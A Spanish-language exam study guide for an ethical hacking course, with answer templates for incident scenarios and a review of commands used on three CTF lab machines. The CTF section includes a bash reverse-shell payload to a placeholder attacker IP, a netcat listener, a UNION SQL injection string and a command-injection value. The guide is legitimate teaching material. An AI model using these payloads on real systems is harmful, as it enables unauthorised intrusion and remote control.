# Guía Pareto — Hacking Ético

> **Lógica de esta guía:** A diferencia de otros módulos, aquí conoces el banco completo de preguntas.
> El profesor elige **2 teoría + 1 CTF** de cada RA. La estrategia Pareto es:
> domina 1 plantilla de respuesta que sirve para CUALQUIER pregunta de teoría RA1,
> conoce 3 conceptos clave que aparecen en MÚLTIPLES preguntas de teoría RA2,
> y repasa tus 3 máquinas CTF con comandos exactos.

---

## Estructura del examen

| Bloque | Tipo | Cantidad | Pts cada una | Total |
|--------|------|----------|-------------|-------|
| RA1 | Teoría | 2 (de pool de 15) | 2 pts | 4 pts |
| RA1 | CTF | 1 (de pool de 15) | 1 pt | 1 pt |
| RA2 | Teoría | 2 (de pool de 15) | 2 pts | 4 pts |
| RA2 | CTF | 1 (de pool de 15) | 1 pt | 1 pt |
| **Total** | | **6 preguntas** | | **10 pts** |

> **Regla del profesor:** entre primera y segunda convocatoria no se repiten preguntas.

---

## CLAVE PARETO RA1 — Una sola plantilla para las 15 preguntas de teoría

**Todas las preguntas RA1 tienen el mismo patrón:** escenario de incidente → identificar ataque → explicar → mitigar.

La respuesta siempre tiene 4 partes:

```
1. TIPO DE ATAQUE
   → Nombre técnico + cómo se manifiesta en el escenario

2. IMPACTO EN CIA
   → Qué principio(s) vulnera y por qué (Confidencialidad / Integridad / Disponibilidad)

3. RESPUESTA INMEDIATA (contención + evidencias)
   → Lo primero que harías en las próximas horas

4. MITIGACIÓN A LARGO PLAZO
   → Controles técnicos y organizativos para que no vuelva a ocurrir
```

Domina esta plantilla + los 6 ataques de abajo = puedes responder cualquier pregunta RA1.

---

## Los 6 ataques más probables en RA1 (con plantilla rellena)

### Ataque 1 — Phishing (P2 del banco)
> Escenario tipo: "empleado introdujo credenciales en página falsa"

**1. Tipo:** Phishing — suplantación de identidad mediante web/email falso que imita una fuente legítima para robar credenciales. Si está dirigido a una persona concreta: Spear Phishing.

**2. CIA:**
- Confidencialidad: credenciales comprometidas → acceso a información privada del empleado
- Integridad/Disponibilidad: dependen de los permisos del usuario comprometido

**3. Inmediata:**
- Resetear credenciales comprometidas INMEDIATAMENTE
- Revocar todas las sesiones activas del usuario
- Revisar logs de acceso para detectar si el atacante ya entró
- Comprobar si se enviaron emails desde la cuenta comprometida

**4. Largo plazo:**
- MFA/2FA: credenciales robadas son inútiles sin el segundo factor
- Filtros de email: SPF, DKIM, DMARC para validar dominios
- Formación antiphishing con simulacros periódicos
- Gestor de contraseñas corporativo

---

### Ataque 2 — Ransomware (P9 del banco)
> Escenario tipo: "datos cifrados, mensaje de rescate"

**1. Tipo:** Ransomware — cifra los archivos del sistema y exige rescate económico (normalmente en criptomoneda) para recuperar el acceso. Los modernos usan "doble extorsión": exfiltran antes de cifrar.

**2. CIA:**
- Disponibilidad: impacto crítico e inmediato — sistemas inoperativos
- Integridad: archivos originales alterados sin autorización
- Confidencialidad: si hay doble extorsión, datos expuestos al exterior

**3. Inmediata:**
- Aislar INMEDIATAMENTE los equipos afectados (desconectar de la red)
- NO apagar los equipos — la RAM puede contener evidencias forenses
- NO pagar el rescate — no garantiza recuperar los datos
- Preservar evidencias: captura del mensaje de rescate, logs de red

**4. Largo plazo:**
- Backups aislados de red — regla **3-2-1**: 3 copias, 2 medios distintos, 1 offsite
- Segmentación de red para limitar propagación lateral
- EDR con detección de cifrado masivo de archivos
- Formación antiphishing (vector de entrada más común)

---

### Ataque 3 — Fuerza bruta (P1 del banco)
> Escenario tipo: "múltiples intentos fallidos de autenticación desde distintas IPs"

**1. Tipo:** Fuerza bruta / Credential Stuffing — intentos automáticos de login probando combinaciones usuario/contraseña. Herramientas: Hydra, Burp Suite Intruder.

**2. CIA:**
- Confidencialidad: si tiene éxito, acceso a información privada
- Disponibilidad: el volumen puede saturar el servidor (efecto DDoS secundario)

**3. Inmediata:**
- Bloquear IPs atacantes en firewall: `iptables -A INPUT -s IP_ATACANTE -j DROP`
- Bloquear temporalmente la cuenta objetivo
- Revisar `/var/log/auth.log` para detectar si el ataque tuvo éxito
- Preservar logs como evidencia

**4. Largo plazo:**
- Límite de intentos de login (lockout tras 5 fallos)
- MFA/2FA
- CAPTCHA en formulario de login
- Fail2ban para bloqueo automático de IPs con muchos fallos

---

### Ataque 4 — DDoS (P5 del banco)
> Escenario tipo: "servicio caído + tráfico masivo desde el exterior"

**1. Tipo:** DDoS (Distributed Denial of Service) — botnet genera tráfico masivo para saturar el objetivo hasta dejarlo inoperativo. Tipos: volumétrico, HTTP flood, SYN flood.

**2. CIA:**
- Disponibilidad: servicio inaccesible — afectación directa y total
- Confidencialidad/Integridad: normalmente no afectadas, pero el DDoS puede ser distractor de otro ataque simultáneo

**3. Inmediata:**
- Contactar ISP para filtrado de tráfico upstream
- Activar Anti-DDoS del proveedor cloud (AWS Shield, Cloudflare)
- Rate limiting en firewall/WAF

**4. Largo plazo:**
- CDN con capacidad de absorber tráfico masivo (Cloudflare, Akamai)
- SLA con ISP que incluya mitigación DDoS
- Anycast routing para distribuir tráfico

---

### Ataque 5 — Backdoor / Webshell (P10 del banco)
> Escenario tipo: "acceso remoto sin autenticación, puerta trasera"

**1. Tipo:** Backdoor/Webshell — archivo malicioso (ej: PHP) que permite ejecución remota de comandos desde el navegador, sin autenticación. Proporciona acceso persistente al atacante.

**2. CIA:**
- Confidencialidad: puede leer archivos, configs con credenciales, datos de usuarios
- Integridad: puede modificar archivos, insertar código malicioso
- Disponibilidad: puede eliminar archivos o instalar ransomware

**3. Inmediata:**
- NO eliminar la webshell — primero preservar evidencias (hash, fecha de creación, logs)
- Aislar el servidor de la red
- Buscar otras webshells: `find /var/www -name "*.php" -newer index.php`
- Cambiar TODAS las credenciales: BD, SSH, paneles admin

**4. Largo plazo:**
- Auditoría de integridad de archivos (AIDE, Tripwire)
- WAF para bloquear uploads de archivos PHP al webroot
- Monitorización continua de ficheros en webroot
- Desplegar desde snapshot limpio verificado

---

### Ataque 6 — Keylogger (P8 del banco)
> Escenario tipo: "programa que registra pulsaciones y las envía al exterior"

**1. Tipo:** Keylogger / Spyware — malware que registra pulsaciones de teclado y las envía a un servidor externo. Roba credenciales, datos bancarios y comunicaciones privadas.

**2. CIA:**
- Confidencialidad: todo lo que el usuario escribe queda expuesto (contraseñas, mensajes)

**3. Inmediata:**
- Aislar el equipo de la red
- Analizar procesos en ejecución y conexiones salientes (`netstat`, `ps aux`)
- Cambiar TODAS las contraseñas desde un dispositivo limpio
- Análisis forense del malware para determinar alcance

**4. Largo plazo:**
- EDR/Antivirus con detección de comportamiento
- Política de no usar contraseñas en equipos no corporativos
- MFA para que las contraseñas robadas sean inútiles

---

## CLAVE PARETO RA2 — 3 conceptos que cubren múltiples preguntas

### Concepto 1 — Tríada CIA (aparece en P17, P29, P30)

Es el concepto más preguntado del módulo. Aparece en 3 preguntas del banco.

| Principio | Definición | ¿Qué lo vulnera? |
|-----------|-----------|-----------------|
| **Confidencialidad** | Solo los autorizados acceden a la información | Phishing, keylogger, acceso no autorizado, OSINT |
| **Integridad** | Los datos no han sido alterados sin autorización | Modificación de registros, SQL Injection, ransomware |
| **Disponibilidad** | El sistema es accesible cuando se necesita | DDoS, ransomware, fallos de hardware, errores de config |

**Plantilla para P30** (las tres en un solo escenario):
1. "Se vulnera la **Confidencialidad** porque [acceso sin autorización a datos]: ejemplo concreto del escenario"
2. "Se vulnera la **Integridad** porque [datos modificados sin autorización]: ejemplo concreto"
3. "Se vulnera la **Disponibilidad** porque [servicio inaccesible]: ejemplo concreto"

---

### Concepto 2 — OSINT / Reconocimiento pasivo (aparece en P20, relacionado con P13 RA1)

**Qué es:** recopilar información pública sin interactuar con los sistemas del objetivo. Fase 1 de la Kill Chain.

**Fuentes y qué se obtiene:**

| Fuente | Información obtenible |
|--------|----------------------|
| Buscadores (Google dorks) | Subdominios, ficheros expuestos, tecnologías |
| WHOIS / registros de dominio | Titulares, IPs, fechas de registro, servidores DNS |
| LinkedIn / redes sociales | Estructura organizativa, cargos, tecnologías usadas |
| GitHub / repositorios públicos | Código fuente, credenciales expuestas, configs |
| Shodan | Dispositivos y servicios expuestos a internet |

**Cómo se usa en fases posteriores:**
- Spear phishing personalizado (nombres, cargos reales de empleados)
- Ataques a versiones concretas de software detectadas
- Credenciales encontradas en repos → acceso directo

---

### Concepto 3 — Tipos de análisis / auditoría (aparece en P14, P22, P26)

| Tipo | Información que tiene el auditor | También se llama |
|------|--------------------------------|------------------|
| **Black box** | Ninguna (igual que el atacante real) | Caja negra |
| **Grey box** | Información parcial (usuario sin privilegios) | Caja gris |
| **White box** | Información completa (código, arquitectura) | Caja blanca |

**Ventajas Black box:** simula un atacante real, detecta vulnerabilidades visibles desde el exterior.
**Ventajas White box:** cobertura completa, detecta vulnerabilidades internas.

---

## CLAVE PARETO CTF — Técnicas por máquina

Las CTF questions preguntan sobre lo que HICISTE en las máquinas. Repasa los comandos exactos.

### Máquina: imagine
- **Técnicas:** Nmap, ffuf (fuzzing web), base64 decode, SSH login
- **Comandos clave:**
  ```bash
  nmap -sV -sC -p- <IP>
  ffuf -u http://<IP>/FUZZ -w /wordlist.txt
  echo "cadena" | base64 -d
  ssh jude@<IP> -p 2222
  ```

### Máquina: jump_force
- **Técnicas:** Nmap, gobuster, SQL Injection (UNION), Command Injection, reverse shell, pivoting SSH
- **Comandos clave:**
  ```bash
  gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak
  # SQL Injection: 1' UNION SELECT user,pass FROM users-- -
  # Command Injection: command1=1; id
  nc -lvnp 4444   # listener atacante
  bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1   # payload víctima
  ssh pablo@dos -p 2222   # pivoting a contenedor interno
  ```

### Máquina: odyssey_v2
- **Técnicas:** Nmap, gobuster, base64/hex decode, steghide (esteganografía), SSH root
- **Comandos clave:**
  ```bash
  gobuster dir -u http://<IP> -w wordlist.txt
  echo "cadena" | base64 -d           # decodificar base64
  xxd -r -p <<< "cadena hex"         # decodificar hex
  steghide extract -sf imagen.jpg -p "passphrase"   # extraer datos ocultos
  ssh root@<IP>
  ```

---

## Tabla de probabilidad de preguntas

### RA1 Teoría (elige 2 de 15)

| Pregunta | Tema | Probabilidad |
|----------|------|-------------|
| P2 | Phishing con credenciales | **MUY ALTA** |
| P9 | Ransomware activo | **MUY ALTA** |
| P5 | DDoS en curso | **ALTA** |
| P1 | Fuerza bruta | **ALTA** |
| P10 | Backdoor / webshell | **ALTA** |
| P13 | OSINT en redes sociales | **MEDIA-ALTA** |
| P8 | Keylogger | **MEDIA** |

### RA1 CTF (elige 1 de 15)

| Pregunta | Tema | Probabilidad |
|----------|------|-------------|
| P5 | Reverse shell | **MUY ALTA** |
| P12 | SQL Injection | **ALTA** |
| P8 | Escalada de privilegios con sudo | **ALTA** |
| P1 | Nmap scanning | **ALTA** |
| P10 | Esteganografía / ofuscación | **MEDIA-ALTA** |

### RA2 Teoría (elige 2 de 15)

| Pregunta | Tema | Probabilidad |
|----------|------|-------------|
| P30 | Tríada CIA — las tres en un incidente | **MUY ALTA** |
| P20 | OSINT desde fuentes públicas | **MUY ALTA** |
| P17 | CIA con ejemplos concretos | **ALTA** |
| P18 | Debilidades de autenticación | **ALTA** |
| P23 | Definición y clasificación de vulnerabilidades | **ALTA** |

### RA2 CTF (elige 1 de 15)

| Pregunta | Tema | Probabilidad |
|----------|------|-------------|
| P30 | Cadena completa: reconocimiento → explotación → post-explotación | **MUY ALTA** |
| P24 | Dato codificado vs dato cifrado | **ALTA** |
| P16 | Interpretación salida Nmap | **ALTA** |
| P26 | Identificar app vulnerable a SQL Injection | **MEDIA-ALTA** |

---

*Fuentes: banco de preguntas del profesor (Preguntas_Teoria_80.txt, Preguntas_CTF_20.txt), kill chains de imagine / jump_force / odyssey_v2*
